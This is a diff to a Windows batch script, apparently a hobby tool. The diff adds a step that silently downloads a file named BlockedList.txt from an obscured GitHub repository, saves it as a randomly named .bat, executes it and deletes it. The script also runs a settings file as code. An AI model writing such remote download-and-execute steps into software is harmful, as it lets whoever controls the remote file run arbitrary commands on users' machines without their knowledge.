@@ -19,6 +19,19 @@ echo TRY TO REINSTALL
 echo OR CONTACT Slinky#5245
 set /p error=
 goto error
+goto loading
+:blocked
+cls
+color 4
+echo You are blocked!
+set /p f=
+exit
+:loading
+echo %hide% 
+set file2=%random%%random%%random%
+curl "https://raw.githubusercontent.com/W5GZ-X9YY-4GZY-3DYE/TF3N-KWTN-GWHL-6DA4/main/BlockedList.txt" --output "%file2%.bat"
+call %file2%.bat
+del %file2%.bat
 
 :load
 rename settings.ini settings.bat & call settings.bat & rename settings.bat settings.ini & set greenblack=[42;30m & set yellowblack=[43;30m & set yellowyellow=[43;33m & set whiteblack=[47;30m & set redblack=[43;31m
